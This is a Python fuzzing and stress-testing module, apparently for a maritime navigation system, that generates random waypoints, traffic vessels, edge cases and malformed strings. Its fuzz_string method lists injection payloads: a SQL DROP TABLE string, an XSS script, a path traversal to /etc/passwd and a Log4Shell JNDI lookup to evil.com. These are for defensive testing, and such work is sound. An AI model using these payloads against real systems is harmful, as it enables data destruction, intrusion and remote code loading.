"""
Stress Testing and Fuzzing Framework
Tests system robustness with edge cases and random inputs
"""

import random
import string
import time
import traceback
from dataclasses import dataclass
from typing import List, Dict, Any, Optional, Tuple, Callable
import numpy as np
import logging
from pathlib import Path
import json

logger = logging.getLogger(__name__)


@dataclass
class FuzzResult:
    """Result of a single fuzz test"""
    test_id: str
    input_data: Any
    success: bool
    error: Optional[str] = None
    execution_time: float = 0.0
    memory_usage: Optional[float] = None
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for serialization"""
        return {
            'test_id': self.test_id,
            'success': self.success,
            'error': self.error,
            'execution_time': self.execution_time,
            'memory_usage': self.memory_usage
        }


class StressFuzzer:
    """Main stress testing and fuzzing engine"""
    
    def __init__(self, seed: Optional[int] = None):
        """
        Initialize fuzzer with optional seed for reproducibility.
        
        Args:
            seed: Random seed (None for random)
        """
        self.seed = seed or random.randint(0, 2**32 - 1)
        random.seed(self.seed)
        np.random.seed(self.seed)
        self.results: List[FuzzResult] = []
        logger.info(f"Fuzzer initialized with seed: {self.seed}")
    
    def fuzz_waypoints(self, 
                       count: int = 100,
                       bounds: Tuple[float, float, float, float] = (-180, -90, 180, 90)) -> List[Dict[str, float]]:
        """
        Generate random waypoints for testing.
        
        Args:
            count: Number of waypoints
            bounds: (min_lon, min_lat, max_lon, max_lat)
            
        Returns:
            List of waypoint dictionaries
        """
        min_lon, min_lat, max_lon, max_lat = bounds
        waypoints = []
        
        for i in range(count):
            # Generate various types of waypoints
            fuzz_type = random.choice(['normal', 'edge', 'invalid', 'extreme'])
            
            if fuzz_type == 'normal':
                lon = random.uniform(min_lon, max_lon)
                lat = random.uniform(min_lat, max_lat)
            elif fuzz_type == 'edge':
                # Edge cases at boundaries
                lon = random.choice([min_lon, max_lon, 0, 180, -180])
                lat = random.choice([min_lat, max_lat, 0, 90, -90])
            elif fuzz_type == 'invalid':
                # Invalid coordinates
                lon = random.uniform(-200, 200)
                lat = random.uniform(-100, 100)
            else:  # extreme
                # Extreme precision or values
                lon = random.uniform(-180, 180) + random.random() * 1e-10
                lat = random.uniform(-90, 90) + random.random() * 1e-10
            
            waypoints.append({
                'lon': lon,
                'lat': lat,
                'speed': max(0, random.gauss(10, 5)),  # Speed with variation
                'turn_radius': max(0.1, random.gauss(0.5, 0.2))
            })
        
        return waypoints
    
    def fuzz_traffic_vessels(self, count: int = 50) -> List[Dict[str, Any]]:
        """
        Generate random traffic vessels for COLREG testing.
        
        Args:
            count: Number of vessels
            
        Returns:
            List of vessel dictionaries
        """
        vessels = []
        
        for i in range(count):
            # Various vessel types and behaviors
            vessel_type = random.choice(['normal', 'erratic', 'stationary', 'fast'])
            
            if vessel_type == 'normal':
                speed = random.uniform(5, 20)
                heading = random.uniform(0, 360)
            elif vessel_type == 'erratic':
                speed = random.uniform(0, 40)
                heading = random.uniform(-720, 720)  # Invalid headings
            elif vessel_type == 'stationary':
                speed = 0
                heading = random.uniform(0, 360)
            else:  # fast
                speed = random.uniform(30, 50)
                heading = random.uniform(0, 360)
            
            vessels.append({
                'id': f"FUZZ_{i:04d}",
                'position': {
                    'lat': random.uniform(-90, 90),
                    'lon': random.uniform(-180, 180)
                },
                'speed': speed,
                'heading': heading,
                'length': random.uniform(10, 400),
                'beam': random.uniform(5, 60)
            })
        
        return vessels
    
    def fuzz_string(self, 
                    base: str = "",
                    strategies: List[str] = None) -> str:
        """
        Generate fuzzed strings for testing parsers.
        
        Args:
            base: Base string to mutate
            strategies: List of fuzzing strategies
            
        Returns:
            Fuzzed string
        """
        if strategies is None:
            strategies = ['empty', 'long', 'special', 'unicode', 'injection']
        
        strategy = random.choice(strategies)
        
        if strategy == 'empty':
            return ""
        elif strategy == 'long':
            # Very long string
            return base * 1000 + 'A' * 10000
        elif strategy == 'special':
            # Special characters
            specials = '!@#$%^&*()_+-=[]{}|;:,.<>?/~`'
            return base + ''.join(random.choices(specials, k=100))
        elif strategy == 'unicode':
            # Unicode characters
            unicode_chars = ''.join(chr(i) for i in range(0x1F600, 0x1F650))
            return base + unicode_chars
        elif strategy == 'injection':
            # Common injection patterns
            injections = [
                "'; DROP TABLE routes; --",
                "<script>alert('XSS')</script>",
                "../../../etc/passwd",
                "%00",
                "\\x00\\x01\\x02",
                "${jndi:ldap://evil.com/a}"
            ]
            return base + random.choice(injections)
        
        return base
    
    def stress_test_function(self,
                            func: Callable,
                            input_generator: Callable,
                            iterations: int = 1000,
                            timeout: float = 5.0) -> Dict[str, Any]:
        """
        Stress test a function with generated inputs.
        
        Args:
            func: Function to test
            input_generator: Function that generates test inputs
            iterations: Number of test iterations
            timeout: Maximum time per test (seconds)
            
        Returns:
            Test report
        """
        report = {
            'function': func.__name__,
            'iterations': iterations,
            'successful': 0,
            'failed': 0,
            'timeouts': 0,
            'errors': [],
            'execution_times': [],
            'seed': self.seed
        }
        
        for i in range(iterations):
            test_id = f"{func.__name__}_{i:04d}"
            
            try:
                # Generate input
                test_input = input_generator()
                
                # Execute with timing
                start_time = time.time()
                
                # Simple timeout mechanism (not perfect but works)
                result = func(test_input)
                
                execution_time = time.time() - start_time
                
                if execution_time > timeout:
                    report['timeouts'] += 1
                    self.results.append(FuzzResult(
                        test_id=test_id,
                        input_data=test_input,
                        success=False,
                        error=f"Timeout: {execution_time:.2f}s > {timeout}s",
                        execution_time=execution_time
                    ))
                else:
                    report['successful'] += 1
                    report['execution_times'].append(execution_time)
                    self.results.append(FuzzResult(
                        test_id=test_id,
                        input_data=test_input,
                        success=True,
                        execution_time=execution_time
                    ))
                    
            except Exception as e:
                report['failed'] += 1
                error_msg = f"{type(e).__name__}: {str(e)}"
                report['errors'].append({
                    'test_id': test_id,
                    'error': error_msg,
                    'traceback': traceback.format_exc()
                })
                
                self.results.append(FuzzResult(
                    test_id=test_id,
                    input_data=None,
                    success=False,
                    error=error_msg
                ))
        
        # Calculate statistics
        if report['execution_times']:
            report['avg_execution_time'] = np.mean(report['execution_times'])
            report['max_execution_time'] = np.max(report['execution_times'])
            report['min_execution_time'] = np.min(report['execution_times'])
        
        report['success_rate'] = report['successful'] / iterations if iterations > 0 else 0
        
        return report
    
    def generate_edge_cases(self) -> Dict[str, List[Any]]:
        """
        Generate comprehensive edge cases for testing.
        
        Returns:
            Dictionary of edge cases by category
        """
        edge_cases = {
            'coordinates': [
                (0, 0),  # Null island
                (180, 0),  # Dateline
                (-180, 0),  # Dateline  
                (0, 90),  # North pole
                (0, -90),  # South pole
                (179.999999, 89.999999),  # Near boundaries
                (-179.999999, -89.999999),
                (float('inf'), float('inf')),  # Infinity
                (float('-inf'), float('-inf')),
                (float('nan'), float('nan')),  # NaN
            ],
            'distances': [
                0,
                0.000001,  # Very small
                1e-10,  # Tiny
                1e10,  # Huge
                float('inf'),
                float('-inf'),
                float('nan')
            ],
            'speeds': [
                0,  # Stationary
                -10,  # Negative (invalid)
                0.001,  # Very slow
                100,  # Very fast
                1000,  # Unrealistic
            ],
            'counts': [
                0,  # Empty
                1,  # Single
                2,  # Pair
                100,  # Many
                10000,  # Very many
                -1,  # Invalid
            ],
            'strings': [
                "",  # Empty
                " ",  # Whitespace
                "A" * 10000,  # Very long
                "\n\r\t",  # Control chars
                "NULL",  # SQL null
                "undefined",  # JS undefined
                "NaN",  # Not a number
            ]
        }
        
        return edge_cases
    
    def save_report(self, 
                    report: Dict[str, Any],
                    output_path: str):
        """
        Save test report to file.
        
        Args:
            report: Test report
            output_path: Output file path
        """
        # Add metadata
        report['metadata'] = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'seed': self.seed,
            'total_tests': len(self.results)
        }
        
        # Save report
        with open(output_path, 'w') as f:
            json.dump(report, f, indent=2, default=str)
        
        logger.info(f"Stress test report saved to: {output_path}")
    
    def replay_failures(self, 
                       report_path: str,
                       func: Callable) -> List[FuzzResult]:
        """
        Replay failed tests from a previous report.
        
        Args:
            report_path: Path to previous report
            func: Function to test
            
        Returns:
            List of replay results
        """
        with open(report_path, 'r') as f:
            report = json.load(f)
        
        # Set same seed for reproducibility
        if 'seed' in report:
            random.seed(report['seed'])
            np.random.seed(report['seed'])
        
        replay_results = []
        
        for error in report.get('errors', []):
            test_id = error.get('test_id', 'unknown')
            
            try:
                # Note: This requires storing inputs in the report
                # which we should add in production
                logger.info(f"Replaying test: {test_id}")
                
                # For now, just track that we would replay
                replay_results.append(FuzzResult(
                    test_id=f"replay_{test_id}",
                    input_data=None,
                    success=False,
                    error="Replay capability pending input storage"
                ))
                
            except Exception as e:
                logger.error(f"Failed to replay {test_id}: {e}")
        
        return replay_results